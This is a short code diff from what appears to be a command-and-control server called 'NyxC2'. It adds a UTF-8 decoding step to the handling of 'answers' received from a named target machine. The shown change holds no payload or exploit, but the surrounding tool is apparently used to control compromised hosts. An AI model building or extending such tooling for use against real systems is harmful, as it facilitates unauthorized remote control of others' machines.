@@ -182,6 +182,8 @@ def server():
 
                             new_data = plaintext
                             print(f"\n[answer from {nom_cible}] :\n {new_data}")
+                            
+                        new_data = new_data.decode("utf-8", errors="ignore")
                         if new_data.endswith(">"):
                             print("\nNyxC2 > ", end="", flush=True)
 
